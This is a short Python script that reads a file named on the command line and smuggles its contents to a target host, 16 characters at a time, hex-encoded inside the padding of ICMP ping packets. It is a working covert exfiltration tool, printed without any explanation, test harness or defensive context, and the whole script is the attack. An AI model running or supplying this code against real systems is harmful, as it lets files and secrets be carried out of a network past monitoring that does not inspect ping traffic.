#!/bin/python3
import sys, subprocess
file = sys.argv[1]
target = sys.argv[2]
msg=''
with open(file) as fh:
    for line in fh:
        for ch in line:
            msg=msg+ch
            if(len(msg))==16:
                print ("Sending Secret message")
                enctext = r''.join(hex(ord(c)).split("x")[1] for c in msg)
                try:
                    subprocess.check_output(["ping", "-p", enctext, "-c", "1", target])
                    msg=''
                except:
                    print("Packet Loss")
                    msg=''

                


